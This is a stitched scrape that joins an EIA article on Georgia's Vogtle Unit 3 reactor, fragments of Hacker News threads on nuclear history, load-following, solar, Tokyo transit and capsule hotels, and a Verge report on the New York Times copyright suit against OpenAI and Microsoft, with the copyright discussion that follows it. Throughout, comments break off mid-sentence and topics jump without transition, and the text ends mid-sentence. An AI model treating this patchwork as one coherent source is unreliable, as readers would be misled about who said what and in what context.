December 26, 2023 First new U.S. nuclear reactor since 2016 is now in operation From December 18 to January 1, Today in Energy will feature some of our favorite articles from 2023. Today’s article was originally published on August 1. Data source: U.S. Energy Information Administration, Preliminary Monthly Electric Generator Inventory, and Georgia Power press release Note: Data excludes capacity built and retired before 2002. A new reactor at Georgia’s Vogtle nuclear power plant is now in commercial operation, according to an announcement from Georgia Power, one of the plant’s owners. It is the first new nuclear reactor to start up in the United States since the Tennessee Valley Authority’s Watts Bar 2 was commissioned in 2016. The new 1,114 megawatt (MW) Unit 3 reactor joins two existing reactors at Plant Vogtle, which is jointly owned by Georgia Power and three other electric utility companies. The plant’s first two reactors, with a combined 2,430 MW of nameplate capacity, came online in the late 1980s. Georgia Power expects another similar-sized fourth reactor, Vogtle Unit 4, to begin operation sometime between November 2023 and March 2024. The two new reactors will make Plant Vogtle the largest nuclear power plant in the country, surpassing the 4,210 MW Palo Verde plant in Arizona. Construction at the two new reactor sites began in 2009. Originally expected to cost $14 billion and begin commercial operation in 2016 (Vogtle 3) and 2017 (Vogtle 4), the project ran into significant construction delays and cost overruns. The total cost of the project is now estimated at more than $30 billion. Both Vogtle Units 3 and 4 use a new reactor design, the Westinghouse AP1000. This next generation advanced reactor has a smaller footprint and simpler design than previous generation reactor technologies. It also features robust passive safety systems that can shut down the reactor without any operator action or external power source. Units 3 and 4 are the first U.S. deployment of the AP1000 Generation III+ reactor. Two other Westinghouse AP1000 reactors were planned for a nuclear power plant in South Carolina, but construction was halted in 2017. The first commercial nuclear power reactor in the United States came online in December 1957 in Shippingport, Pennsylvania. Most U.S. nuclear reactors were built in the 20-year period from 1970 to 1990. Prior to Vogtle Unit 3, the last nuclear reactor to start in the United States was Watts Bar Unit 2 in Tennessee. Construction on Watts Bar 2 began in 1973 but was suspended in 1985. Work resumed in 2007, and the reactor came online in 2016. With 95,881 MW of nuclear power capacity at 93 operating commercial reactors, the United States has more nuclear capacity than any other country. Nuclear power plants produce nearly 20% of the country’s electricity. Although a number of nuclear reactors have retired in recent years, there has been interest in nuclear power as an energy resource to help reduce the carbon footprint of the U.S. electric power sector. Generation from nuclear reactors doesn’t produce CO2 emissions and can provide essential baseload power that would otherwise largely come from coal- and natural gas-fired plants. Recent legislation, such as the Bipartisan Infrastructure Law and the Inflation Reduction Act, supports U.S. nuclear energy as part of a clean energy, zero-carbon generating portfolio.

Work resumed in 2007, and the reactor came online in 2016.\"More on that here: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Watts_Bar_Nuclear_Plant#Unit_2 reply mardifoufs 11 hours agoparentI can&#x27;t even imagine how you&#x27;d get the parts, and they probably can&#x27;t change the plans either. Ok so I decided to look into it a bit more, and here are some interesting details from documents on the nrc.gov and EIA.gov:Here&#x27;s some context for what was happening in 1985, from the eia:>\"As a consequence of the identification of a large number of deficiencies shortly before the WBN Unit 1 license was expected to be issued, the Nuclear Regulatory Commission (NRC) sent a letter to TVA [...]. In response to this letter, TVA developed a Nuclear Performance Plan (NPP) to address corporate and site-specific issues, establishing programs to address a wide variety of material, design, and programmatic deficiencies. WBN Unit 2 construction was suspended at about that time, with major structures in place and equipment such as reactor coolant system piping installed.\"And while most of the documentation was very terse and spoke more about specific regulatory requirements that I don&#x27;t understand, this is pretty interesting:(From the nrc.gov)>\"The NRC staff reviewed TVA’s refurbishment program and found the following: (1) TVA was refurbishing or replacing most active components and instruments; (2) TVA had determined the potential degradation mechanism for each category of components, along with any contributing environmental factors; (3) the acceptance criteria were developed from the licensing basis, design specifications, and vendor specifications; (4) the proposed inspections and testing included in the program could be expected to identify degradation; and (5) refurbishment activities would be in accordance with applicable vendor and design specifications or requirements.\"That sounds like a massive, massive amount of work. It explains why it took longer even if the reactor was apparently 60% completed.(From the eia) :>\"That time, a study found Unit 2 to be effectively 60% complete with $1.7 billion invested. The study said the plant could be finished in five years at an additional cost of $2.5 billion\" reply necheffa 9 hours agorootparent> I can&#x27;t even imagine how you&#x27;d get the parts, and they probably can&#x27;t change the plans either.One of the bullets on the box is that the AP1000 uses a fairly standardized design, unlike many prior designs which were mostly a patchwork of one-off designs.

The latest one near where I live (Angra 3) has been under construction since 1984, and it should be complete in a few more years if it doesn&#x27;t pause again; construction of the previous one (Angra 2), according to Wikipedia, started in 1976 and came online in 2001. reply cheschire 11 hours agorootparentWell the Three Mile Island accident was in 1979, so I imagine that created a lot of resistance to continued construction across the country.https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Three_Mile_Island_accident reply Projectiboga 9 hours agorootparentThree Mile Island was a partial meltdown.

But of course it is the only sensible reaction to such an incident to check your designs for faults and review all reactors under construction. And then decide whether it is prudent to continue with the construction and which changes would be required. reply pas 40 minutes agorootparentIn effect they did through overzealous safety requirements (which made it more expensive compared to other forms of electricity generation)this regulatory inconsistency is mostly irrational, because it&#x27;s clear through other policies that society values safety much less in other policies (eg. driving, all the emissions from other sources, gun safety, etc)of course regulations are not perfect mirrors of society&#x27;s preferences, but it&#x27;s close enough. (and of course society doesn&#x27;t \"has to be\" consistent, but I would say a pretty vocal minority, perhaps even the majority wishes it to be so)..that said, yes, if the world would order 1000+ nuclear power plants, all standardized, then we could have it cheaper, because then it would make sense to invest in automation, and maybe modular small reactors can already get enough traction. but since we are not ordering that many and even AP1000 is just a brand not really a standard, there&#x27;s practically no economies of scale reply hef19898 15 minutes agorootparentConsidering the potential damage, nuclear is right up there with aviation, medical and life science when it comes to safety standards. Because each and every incident can be traced back to ignoring whatever safety standards and practices where applicable at the time these accidents happened.Someone would have to pay for those 1000 NPPs, and in the current market conditions no one is willing to, because the ROI isn&#x27;t there. Even you said so, there is no NPP standard in place to begin with, so before those 1000 plants are ordered, this standard design has to defined, agreed upon and developed first. And that takes how long in your opinion? reply _ph_ 15 minutes agorootparentprevIf you claim the safety requirements were overzealous, do you have any data to substantiate your claim? reply radicalbyte 55 minutes agorootparentprevCoal cause more cancer and pumps a huge amount of radioactive material into the sky but I&#x27;ve not seen anyone closing coal power stations to stop that. The fear of nuclear power is just one of those irrational fears.. reply _ph_ 12 minutes agorootparentOf course people want to close coal power stations too. One might argue about the relative timing, but the goal is to get rid of nuclear and coal. And while a safely operating nuclear plant is actually pretty low on radiation, we unfortunately had severe incidents which released a lot of radiation. Here in Bavaria, the forests are still contaminated by the Chernobyl disaster. Wild boar meat still has to be checked for radiation and a lot of it destroyed as not fit for consumption. Never mind the meat which probably gets eaten unchecked. cinntaile 47 minutes agorootparentprevThe long term plan is to shut down all coal plants. In the US alone coal usage has more than halved since 2008. reply philwelch 31 minutes agorootparentprev> No one banned nuclear.Sometimes, when your employer wants to fire you but doesn’t want you to be able to file for unemployment or accuse them of firing you for some legally impermissible reason, they just make it so miserable to keep working there that you end up quitting. There is a legal term for this: “constructive dismissal”. I hope the implied analogy is obvious. reply Projectiboga 4 hours agorootparentprevHere is the best summary I can post quickly. Sorry for the source.After the cooling water began to drain out of the broken pressure valve on the morning of March 28, 1979, emergency cooling pumps automatically went into operation. Left alone, these safety devices would have prevented the development of a larger crisis. However, human operators in the control room misread confusing and contradictory readings and shut off the emergency water system. The reactor was also shut down, but residual heat from the fission process was still being released. By early morning, the core had heated to over 4,000 degrees, just 1,000 degrees short of meltdown. In the meltdown scenario, the core melts, and deadly radiation drifts across the countryside, fatally sickening a potentially great number of people.As the plant operators struggled to understand what had happened, the contaminated water was releasing radioactive gases throughout the plant. The radiation levels, though not immediately life-threatening, were dangerous, and the core cooked further as the contaminated water was contained and precautions were taken to protect the operators. Shortly after 8 a.m., word of the accident leaked to the outside world. The plant’s parent company, Metropolitan Edison, downplayed the crisis and claimed that no radiation had been detected off plant grounds, but the same day inspectors detected slightly increased levels of radiation nearby as a result of the contaminated water leak. Pennsylvania Governor Dick Thornburgh considered calling an evacuation.Finally, at about 8 p.m., plant operators realized they needed to get water moving through the core again and restarted the pumps. The temperature began to drop, and pressure in the reactor was reduced. The reactor had come within less than an hour of a complete meltdown. More than half the core was destroyed or molten, but it had not broken its protective shell, and no radiation was escaping. The crisis was apparently over.https:&#x2F;&#x2F;www.history.com&#x2F;this-day-in-history&#x2F;nuclear-accident... reply cjpearson 6 hours agorootparentprev\"Accident\" is the official terminology, not an attempt to downplay the severity. reply ortusdux 9 hours agoparentprevConstruction on WNP 3 & 5 began in 1977 in Elma, WA by Washington Public Power Supply System (WPPSS, AKA \"Whoops!\").

There is a chicken and egg situation: nuclear projects don’t get funded because they’re too expensive, so there is no chance to develop expertise in how to build them cheaply, which causes the few that get greenlit to be built by rookie teams that make rookie mistakes that cause costs to skyrocket.The MIT study into the causes of cost overruns: https:&#x2F;&#x2F;news.mit.edu&#x2F;2020&#x2F;reasons-nuclear-overruns-1118 reply phendrenad2 11 hours agorootparent> costly on-site last minute design changesI clicked through to the actual study ( https:&#x2F;&#x2F;www.cell.com&#x2F;joule&#x2F;fulltext&#x2F;S2542-4351(20)30458-X?_r... ) and I couldn&#x27;t find a single sentence mentioning on-site last-minute design changes.

It seems like people [2] are still interested in the stuff the US manufactures.[1] https:&#x2F;&#x2F;www.worldstopexports.com&#x2F;united-states-top-10-export...[2] https:&#x2F;&#x2F;www.usitc.gov&#x2F;research_and_analysis&#x2F;tradeshifts&#x2F;2020... reply corethree 11 hours agorootparentYes but Asia dominates the \"building\" category overall by a massive margin.It&#x27;s just true.Pharmaceuticals, medical and gems are off topic.I&#x27;m sure there&#x27;s other small niches the US dominates in. But overall what I said is the objective truth no matter how much you desire it to be not true.If Asia doesn&#x27;t dominate a niche yet they are aggressively on track to dominate in the near future. reply bumby 11 hours agorootparentCan you elaborate on what you mean by \"building\"? It&#x27;s a nebulous term. If you mean building infrastructure, that&#x27;s true, but also partly because the US invested heavily in the same type of infrastructure a generation or two prior. I would disagree with the pharmaceuticals because that is a manufacturing-intensive industry.Throwing out gems (because that probably isn&#x27;t a good case, like you said), it still amounts to over $1.2 trillion in exports. I&#x27;m sure other countries would love that kind of \"niche\" business. reply corethree 7 hours agorootparentGems isn&#x27;t good also because it&#x27;s mostly aesthetic. No intrinsic utility other then being rare and pretty. You won&#x27;t actually \"improve\" society with gems. It&#x27;s hard to distill this in technical terms but I hope you&#x27;re able to understand without the need to get pedantic.Gemstones therefore are more of a reflection of countries with the ability to purchase the gemstones as an import and less of a reflection of the country actually exporting the gemstones. Right? If a country exports a huge amount of gemstones it means a lot of external countries have an abundance of economic output such that they can purchase frivolous goods that ultimately don&#x27;t contribute much to the economy. North Korea doesn&#x27;t purchase gemstones but maybe a rich country would. And the place where diamonds are mined are mostly from some poor countries in Africa.>Can you elaborate on what you mean by \"building\"? It&#x27;s a nebulous term.Manufacturing and infrastructure I believe are the two words that cover it best off the top of my head but it&#x27;s unnecessary to specify this to the level of pedantic detail you&#x27;re going for here. I think those two terms are clear enough.I think we both know, in general the direction China&#x2F;Asia is going and where they&#x27;re completely dominating the US.

The solar modules therefore act like a ‘smart’ shade adjusting the amount of light they let through.”This makes it possible to optimize the photosynthesis of plants during the seasons and reduce the negative impact of high summer heat on the yields and quality of agricultural products, while recovering the rest of the light in the form of electricity. Starting from July, the panels will be tested for four years on a 165-square-meter surface area. They will replace protective plastic tunnels on strawberries and raspberries.“Dynamically adjusting the light transmitted to the plants paves the way for increased protection from climate variations and possible increases in crop yields thanks to the matching of the light to the needs of the plants and the lowering of the temperature during heat waves via the shading effect,” said Bastien Christ, head of the berries and medicinal plants group at Agroscope.A similar project using different module technology: https:&#x2F;&#x2F;www.pv-magazine.com&#x2F;2023&#x2F;10&#x2F;31&#x2F;baywa-re-starts-build... reply dralley 10 hours agorootparentprevThe logistics of trying to plant, maintain and harvest crops underneath a bunch of solar panels while also needing to deal with the subsequent issues of uneven runoff of water from rain make it seem impractical.

That can be pumped into existing national gas grids, existing gas storage, and sent into existing gas power stations to generate power in quiet times. The article says that solar power has dropped from $100&#x2F;Watt in 1976 to $0.50&#x2F;Watt by 2016, and that instead of slowing down as the low hanging fruit has been picked, that process is speeding up since 2011 when Solar started to become cheaper than other forms of power generation, which changed the feedback loops and is bringing in much more demand which brings more investment, research and production, than before when it was an expensive little-used alternative.This is a linked graph of solar growth compared to International Energy Agency&#x27;s World Energy Outlook predictions: https:&#x2F;&#x2F;rameznaam.com&#x2F;wp-content&#x2F;uploads&#x2F;2020&#x2F;05&#x2F;IEA-Solar-G...In each of 2006, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016, 2018, the IEA predicted deployment of solar would stop accelerating (line going up) and steady off into consistant growth (flatline on that graph). Every year they have been very quickly wrong, and the 2019 predition of flatline is so wrong that by 2021 actual production of 190GW was WAYYYY off the top of that chart.

The ramping speed of nuclear reactors is limited, and they cannot be throttled below 40% output without shutting them down entirely for quite some time. On top of that, the main expense of nuclear reactors is building and maintaining them, so throttling a reactor is not reducing the costs. You really want to run a nuclear reactor with a high load. reply datameta 11 hours agorootparentprevCompression of air in underground cavities> Hydrostor, which is based in Toronto, is one of several startups working on fixing those problems. The company says it’s figured out a way to capture and reuse the heat generated when air is compressed, eliminating the need to burn gas. It’s also figured out a way to make the mechanics work in areas where caverns must be dug out of hard rock, rather than salt.Wind is not reliableI think what you mean is that wind alone is not baseload, not that it is unreliable. It is quite reliable in that its availability is predictable such that it can be coordinated with storage to create virtual baseload. Therefore its failure modes are relatively mild in impact.In contrast, large centralized plants (whether combustion or nuclear) have far more consequential failure modes - for example, losing 1GW of power with little notice, as can happen with these plants, is usually a grid emergency event. reply zo1 9 hours agorootparentprevThe more I think about it, the more I&#x27;m starting to get of the opinion that this entire call or worry about \"storage\" when it comes to solar is a giant distraction.This first thing we need to do is align the costs and incentives.

Certain types of commodity chemical production with &#x27;biological basis&#x27; (another type of renewable, typically) had much more favorable properties economically. And, indeed, you do see, for example, (thermo)plastic products made from chemicals like \"PLA\" increasingly. But, the \"biofuels\" concept is &#x2F; was much more challenging, especially as \"fracking\" technology made great leaps etc.Nuclear has its pros and cons - blanket disavowal is fatuous. Nevertheless, there are substantially more options, systems, technologies, etc. in development and production than are often discussed in too many of the pro-nuke(s) &#x2F; no nuke(s) &#x27;sniping&#x27; chains that have been prevalent in society & on the internet since I was a wee tyke myself. reply internetter 12 hours agorootparent> use &#x27;renewables&#x27; to sequester CO2 from the atmosphere and convert it into something like butanol, for example.are you referring to P2X?

Exactly zero. reply tonyhb 12 hours agorootparentprevCant control rods can be lifted or inserted to meet demand? reply cool_dude85 12 hours agorootparentThere&#x27;s typically a range of operation, so you can adjust a hundred MW but you can&#x27;t drop to 0 or spin up from standstill without a time consuming process.Edit: also, the economics are such that you rarely want to drop load from a nuclear plant unless it&#x27;s offline or for system reasons. The fuel cost is negligible so you&#x27;d rather turn off your gas plant or lower the coal plant and save on those fuels. reply belorn 12 hours agorootparentThat assume we still allow coal, oil or gas power plant to exist in the power grid. We should probably not assume that to be the case, especially after the temperatures rises to a break point and some of the major climate change crisis occurs. reply xorcist 10 hours agorootparentNone of the commercially available (Western) reactor designs today are fast load followers, so you are dependent on having gas or hydro when you project for new nuclear power plants. That&#x27;s one part of the reason why this stuff is politically charged.From what I understand it&#x27;s not a theoretical constraint, but mostly a lack of enough commercial interest for any other design. But it is what it is. reply throw0101b 12 hours agorootparentprev> Cant control rods can be lifted or inserted to meet demand?Thermally it is difficult to dial a reactor up and down. Generally the way nuclear power is modified is by not-sending the steam to generators through a by-pass and quenching their heat in some fashion.So thermal generation stays at 100% (or whatever), but electrical generation output can be dropped. reply mpweiher 10 hours agorootparentprevThey can, though it depends a little on the plant design.It just doesn&#x27;t make any sense to use reliable nuclear as the \"backup\" to unreliable renewables.Because this \"backup\" is already CO2 free. It is also reliable. And cheap to run. So just run it all the time (nuclear tends to have >90% capacity factor).You then simply don&#x27;t need the \"primary\". reply delroth 9 hours agorootparentprevUsually you&#x27;d vary the concentration of boric acid being injected in the reactor&#x27;s core instead, since that doesn&#x27;t involve wear and tear on safety-critical elements of the reactor.Nuclear reactors absolutely can vary their output to match demand, this is what France has been doing for 50+ years (and what Germany was doing before switching back to coal). It&#x27;s not as reactive as coal&#x2F;gas, but you can still vary within 30-100% of output power at a speed of 5% change per minute. Way more than enough to react to 1-day-ahead forecasted supply&#x2F;demand, and way more than enough to react minute-by-minute if you&#x27;ve got a tiny bit of storage to stabilize the grid&#x27;s frequency (e.g. pumped hydro). reply _ph_ 1 hour agorootparentFrance is balancing their reactors with a massive amount of water power, so they are not doing it alone on the reactor side. But I think France is indeed one of the countries with the highest relative amount of nuclear in the grid. Germany went never over 30% nuclear in the mix, so demand matching was way less of a problem. But also, both countries tried to make demand mostly constant like with pushing inefficient heating systems which would consume electricity at night.This is very far off from working well together with a mostly renewable grid, where renewables can cover 100% of the load on most days, but there are larger gaps to be quickly filled. reply ViewTrick1002 9 hours agorootparentprevIt is a hugely complicated system where reactors which are earlier in their fuel cycle ramp more leaving the later ones to run at 100% around the clock.Ramping once is easy. Ramping continuously through the entire fuel cycle requires a meticulously planned fleet. reply angiosperm 7 hours agorootparentprevA nuke operated at 50% of capacity costs the same as one operating at 100%. Thus, power from it at 50% costs twice as much per kWh. But nukes are already not competitive even at 100%, and get less so with each passing day. reply adonovan 12 hours agorootparentprevPerhaps I fail to understand, but doesn&#x27;t this comparison depend on a number of parameters such as the total reactor fuel load and enrichment, the burn rate, the cost of nuclear fuel, the cost of solar PV, the lifetimes of each system, and the relative process efficiencies (notably the cost of decommissioning nuclear)?Otherwise you might as well say a teaspoon (or whatever) of water has as much potential fusion energy as 1 Kg U235 at a fraction of the price. ;-) reply internetter 12 hours agorootparentYes, the amount of estimations I made to get to that number is absurd, and very much \"best case\" with no regard for inefficiencies (both nuclear and solar systems are currently leaving lots on the table). reply credit_guy 12 hours agorootparentprevSmall nitpick: one teaspoon of water has much less potential fusion energy than 1 kg of U235, and actually much much less than 1g of U235, even allowing for fusion technology that does not exist and will not exist in 50 years.Here&#x27;s why.The Sun transforms hydrogen into helium.

Spending a night there for the novelty I can imagine but 3 weeks wow. reply GuB-42 6 hours agorootparentI spent a few nights in capsule hotels, I was surprised at how not claustrophobic it was.What most people don&#x27;t realize is everything there is around the capsules. Usually, when you enter the hotel, you start by going to the locker room. There you put in all the stuff you won&#x27;t need for the night, that is, essentially everything. You may even get a yukata robe, a towel and some toiletries, so it can be literally everything, including your clothes.Then you can take advantage of the amities and relax. You may find showers, hot baths, massage chairs, etc... Only when it is time to sleep you go to your capsule, which is essentially like a bunk bed with privacy, maybe with a bit of equipment like a TV, alarm clock, charging plug...Now, I probably wouldn&#x27;t stay in a capsule hotel for 3 weeks, but I could definitely spend 3 weeks backpacking, stopping in capsule hotels for the night. It is not really designed as a place to stay, more like a place to spend the night with no preparation. Also, while it is cheaper than regular hotels, it is not that cheap, and if you really want cheap, there are other options. reply ehnto 2 hours agorootparentI stayed in APA business hotels for two weeks, often the same price as the capsule hotels even when I booked them the same day and you get a very acceptable room and bathroom.Often when I say that people tell me not to support the big hotelier chains and offer some independent options, which I might try next trip. I do think people might be a bit misguided though, independent or not they are still faceless hotel chains. Which one gets my $60 is hardly a matter of social responsibility.If you are like me and are there for the urbanism, staying in a businesd hotel fits the atmosphere honestly. They&#x27;re commoditized hotels, perfectly serviceable, pragmatic like much of urban life there. reply dr_kiszonka 8 hours agoparentprevI have long wanted to go to Japan, but I am afraid it is not in my cards.

I also spent most of my free time in the Shinjuku area and wandered around exploring a lot. It took a full year before I really knew the area and could find any entrance or tunnel without getting lost. The station has changed and grown a lot since, and acquiring that sense would take even longer today.As it happens, I will be going to Shinjuku later today for the first time in four years to meet an old friend for lunch. I spent some time online yesterday looking at photos and streetview of the area. My friend has been living in the Tokyo area as long as I have and used to go to Shinjuku a lot, too. But he doesn&#x27;t use a smartphone and we&#x27;re meeting on the south side of the station, which has changed a lot. So I prepared a four-page PDF with maps and pictures showing where we will meet, and I told my friend to print it out and bring it along. I hope we&#x27;re able to find each other. reply lovemenot 10 hours agorootparentI might have suggested meeting at the \"farm\" above the South side of the station.

It&#x27;s kinda surprising someone like an AirBnB host, who presumably has to communicate this with many travelers from many places, is so vague about it.If you&#x27;re getting directions via google maps and you have to exit a subway station in Tokyo (and maybe some other cities), it will give you directions underground to the proper exit.

The hotel was nice enough to say how to get there from Shinjuku exit E8 (at least it wasn&#x27;t the A series which I think goes to 15) and it took we half an hour to even exit the subway with my rolling bag. But I was completely disoriented and actual street numbering and signage unhelpful.Then the fun started since I couldn&#x27;t spot the hotel a kind Japanese couple decided to help. Their \"crippling helpfulness\" became clear only after 5 minutes that they were tourists and had no idea where the hotel was, but it took even longer for me to extract myself politely by pointing towards a taxi stand saying I knew where it was.

Apple Maps can tell you exactly where to go including platform and boarding time.Paper tickets are confusing but basically nobody uses them.

You do need to adjust your ticket if you prepaid the wrong distance.Unless you mean two entirely separate lines separated by different gates. reply ayakang31415 10 hours agorootparentThere was a station (which I don&#x27;t remember) I had to leave the subway and buy a different ticket to transfer. Some stations have multiple platforms stacked next to each other that it is easy to transfer even if the lines are managed by different railway companies, but that is not the case all the time. That&#x27;s how I learned that there are multiple railway companies in Tokyo that are not cooperating with each other enough to make the transfer seamless. Once you make a few mistakes, it gets easier, but it is not so friendly to foreigners. Also stations like Shinjuku is so huge that it is very complicated figure out where your exit is. Then again, once you get used to it, it becomes easy. reply jncfhnb 6 hours agorootparentYou might have to switch to, say, a JR train line. But that’s not a function of the paper tickets. Just different lines. Honestly the much crazier thing is that some trains go over tracks of different companies because they simply cooperate for the benefit of the consumer. You mostly don’t need to know whose line it is ever. The niche exception is for tourists with a JR Pass. reply Klonoar 8 hours agorootparentprevIf you’re trying to remember a station in Shinjuku that was confusing with paper tickets, maybe you somehow used the Seibu Line? It’s “Shinjuku” but effectively separate from JR and Metro and a bit different as a result - or at least was the last time I needed it.I don’t know many who ride that line unless living out on it or wanting to take the less crowded way to ‘Baba tho. reply ayakang31415 10 hours agoparentprevSomething I just realized is that the reason why huge stations have multiple platforms is because there are so many people using the station they had to add multiple platforms to accommodate more subway trains to manage the crowd.

Oftentimes a station is shown as a single point on the map, while in reality the point(s) of entry can be a block or more away from what&#x27;s shown. Likewise, choosing the right exit when you leave the station can save you multiple blocks of walking, depending on your final destination.Even just showing the general shape of the station in 2D on the map would be helpful, though obviously this can be tricky when there&#x27;s other points of interest above&#x2F;below the train line. reply wkat4242 7 hours agoparentYep here in Barcelona it&#x27;s like that too.

By Emma Roth, a news writer who covers the streaming wars, consumer tech, crypto, social media, and much more. Previously, she was a writer and editor at MUO. Dec 27, 2023, 1:49 PM UTC| Share this story Photo by Kena Betancur/VIEWpress The New York Times is suing OpenAI and Microsoft for copyright infringement, claiming the two companies built their AI models by “copying and using millions” of the publication’s articles and now “directly compete” with its content as a result. As outlined in the lawsuit, the Times alleges OpenAI and Microsoft’s large language models (LLMs), which power ChatGPT and Copilot, “can generate output that recites Times content verbatim, closely summarizes it, and mimics its expressive style.” This “undermine[s] and damage[s]” the Times’ relationship with readers, the outlet alleges, while also depriving it of “subscription, licensing, advertising, and affiliate revenue.” The complaint also argues that these AI models “threaten high-quality journalism” by hurting the ability of news outlets to protect and monetize content. “Through Microsoft’s Bing Chat (recently rebranded as “Copilot”) and OpenAI’s ChatGPT, Defendants seek to free-ride on The Times’s massive investment in its journalism by using it to build substitutive products without permission or payment,” the lawsuit states. Meanwhile, the release of AI models trained on the Times’ content has proven “extremely lucrative” for both Microsoft and OpenAI, the lawsuit states. The publication claims it has attempted to negotiate with both companies for months to “ensure it received fair value for the use of its content,” but failed to reach a solution. “We respect the rights of content creators and owners and are committed to working with them to ensure they benefit from AI technology and new revenue models,” OpenAI spokesperson Lindsey Held said in an emailed statement to The Verge. “Our ongoing conversations with the New York Times have been productive and moving forward constructively, so we are surprised and disappointed with this development. We’re hopeful that we will find a mutually beneficial way to work together, as we are doing with many other publishers.” Microsoft didn’t immediately responded to The Verge’s request for comment. Related Politico, Business Insider parent Axel Springer inks deal with OpenAI The New York Times blocks OpenAI’s web crawler The publication is suing both companies for copyright infringement and asks them to be held liable for “billions of dollars in statutory and actual damages” for allegedly copying its works. It’s also asking the court to prevent OpenAI and Microsoft from training their AI models using its content, as well as remove the Times’ work from the companies’ datasets. The New York Times is one of many news outlets that have blocked OpenAI’s web crawler in recent months, preventing the AI company from continuing to scrape content from its website and using the data to train AI models. The BBC, CNN, and Reuters have moved to block OpenAI’s web crawler as well. Other publications, however, are embracing AI — or, at least, the payments that come with it. Axel Springer, which owns Politico and Business Insider, struck a deal with OpenAI earlier this month that allows ChatGPT to pull information directly from both sources, while the Associated Press is allowing OpenAI to train its models on its news stories for the next two years.

I do think they should quickly course correct at this point and accept the fact that they clearly owe something to the creators of content they are consuming. If they don’t, they are setting themselves up for a bigger loss down the road and leaving the door open for a more established competitor (Google) to do it the right way. reply belter 17 hours agoparentFor all the leaks on: Secret projects, novelty training algorithms not being published anymore so as to preserve market share, custom hardware, Q* learning, internal politics at companies at the forefront of state of the art LLMs...A thunderous silence is the lack of leaks, on the exact datasets used to train the main commercial LLMs.It is clear OpenAI or Google did not use only Common Crawl. With so many press conferences why did no research journalist ask yet from OpenAI or Google to confirm or deny if they use or used LibGen?Did OpenAI really bought an ebook of every publication from Cambridge Press, Oxford Press, Manning, APress, and so on? Did any of investors due diligence, include researching the legality of the content used for training? reply hhsectech 13 hours agorootparentI&#x27;m not for or against anything at this point until someone gets their balls out and clearly defines what copyright infringement means in this context.If you give a bunch of books to a kid all by the same author and then pay that kid to write a book in a similar style and then I go on to sell that book...have I somehow infringed copyright?The kids book at best is likely to be a very convincing facsimile of the original authors work...but not the authors work.It seems to me that the only solution for artists is to charge for access to their work in a secure environment then lobotomise people on the way out.The endgame seems to be \"you can view and enjoy our work, but if you want to learn or be inspired by it, thats not on\" reply twoodfin 12 hours agorootparentThere are two problems with the “kid” analogy:a) In many closely comparable scenarios, yes, it’s copyright infringement. When Francis Ford Coppola made The Godfather film, he couldn’t just be “inspired” by Puzo’s book. If the story or characters or dialog are similar enough, he has to pay Puzo, even if the work he created was quite different and not a literal “copy”.b) Training an LLM isn’t like giving someone a book. Among other things, it involves making a derivative copy into GPU memory. This copy is not a transitory copy in service of a fair use, nor likely a fair use in itself, nor licensed by the rights-holder. reply EarthMephit 6 hours agorootparent> If the story or characters or dialog are similar enough, he has to pay Puzo, even if the work he created was quite different and not a literal “copy”.I don&#x27;t think that you can copyright a plot or story in any country can you?If he re-wrote the story with different characters and different lines he wouldn&#x27;t have had to to pay Puzo. I&#x27;m sure it would have been frowned upon if its too close, but legally ok. reply randombits0 6 hours agorootparentprev>This copy is not a transitory copy in service of a fair use, nor likely a fair use in itself,Seems vastly transitory and since the output cannot be copyrighted, does no harm to any work it “trained” on. reply andy99 11 hours agorootparentprev> This copy is not a transitory copy in service of a fair useTraining is almost certainly fair use, so it&#x27;s exactly a transitory copy in service of fair use. Training, other than the brief \"transitory copy\" you mention is not copying, it&#x27;s making a minuscule algorithmic adjustment based on fleeting exposure to the data. reply twoodfin 9 hours agorootparentWhy is training “almost certainly” fair use?Congress took the circuit holding in MAI Systems seriously enough to carve out a new fair use exception for copying software—entirely within the memory system of a licensed user—in service of debugging it.If it took an act of Congress to make “unlicensed” debugging a fair use copy… reply PaulDavisThe1st 9 hours agorootparentprevRegarding (b) ... while a specific method of training that involved persistent copying may indeed be a violation, it is far from clear that the general notion of \"send server request for URL, digest response in software that is not a browser\" is automatically a violation. If there is deemed to be a difference (i.e. all you are allowed to do without a license is have a human read it in a browser), then one can see training mechanisms changing to accomodate that. reply twoodfin 9 hours agorootparentIt’s all about the purpose the transitory copy serves. The mechanism doesn’t really matter, so you can’t make categorical claims about (say) non-browser requests. reply soerxpso 11 hours agorootparentprevI don&#x27;t have a comment on your hypothetical, but this case seems to go far beyond that. If you read the actual filing at the bottom of the linked page, NYT provides examples where ChatGPT recited exact multi-paragraph sections of their articles and tried to pass it off as its own words. Plainly reproducing a work is pretty much the only situation where \"is this copyright violation?\" isn&#x27;t really in flux. It&#x27;s not dissimilar to selling PDFs of copywritten books.If NYT were fully rellying on the argument that training a model in wordcraft using their materials is always copyright violation, or only had short quotes to point to, the philosophical debate you&#x27;re trying to have would be more relevant. reply incangold 10 hours agorootparentprevImportantly, the kid- an individual human- got some wealth somewhat proportional to their effort. There’s non-trivial effort in recruiting the kid. We can’t clone the kid’s brain a million times and run it for pennies.There are differences that are ethically, politically and in other ways between an AI doing something and a human doing the exact same thing. Those differences may need reflecting in new laws.IANAL ans don’t have any positive suggestions for good laws, just pointing out that the analogy doesn’t quite hold. I think we’re in new territory where analogies to previous human activities aren’t always productive. reply graphe 12 hours agorootparentprevIronically these artists cant claim to be wholly original as they were certainly inspired. Artists that play live already \"lobotomize\" people on their way out since it&#x27;s not easy to recreate an experience and a video isn&#x27;t the same if it&#x27;s a good show.Artists that make easily reproducible art will circulate as these always have along with AI in a sea of other jpgs. reply flextheruler 12 hours agorootparentprevI think you’re skipping over the problem.In your example you owned the work you gave to the person to create derivatives of.In a more accurate example you would be stealing those books and then giving them to someone else to create derivatives. reply slyall 12 hours agorootparentHow about if I borrowed them from the library and gave them to the kid to read?How about if I got the kid to read the books on a public website where the author made the books available for free? reply OOPMan 9 hours agorootparentprevI think your kid analogy is flawed because it ignores the fact that you couldn&#x27;t reasonably use said \"kid\" to rapidly produce thousands of works in the same style and then go on to use them to flood the market and drown out the original authors presence.Try this with a real \"kid\" and you&#x27;ll run into all kids of real-world constraints whereas flooding the world with derivative drivel using LLMs is something that&#x27;s actually possible.So yeah, stop using weak analogies, it&#x27;s not helpful or intelligent. reply sulrich 5 hours agorootparentprevyou might be well served by reading the actual complaint. reply ethbr1 17 hours agorootparentprevWould be fascinated to hear from someone inside on a throwaway, but my nearest experience is that corporate lawyers aren&#x27;t stupid.If 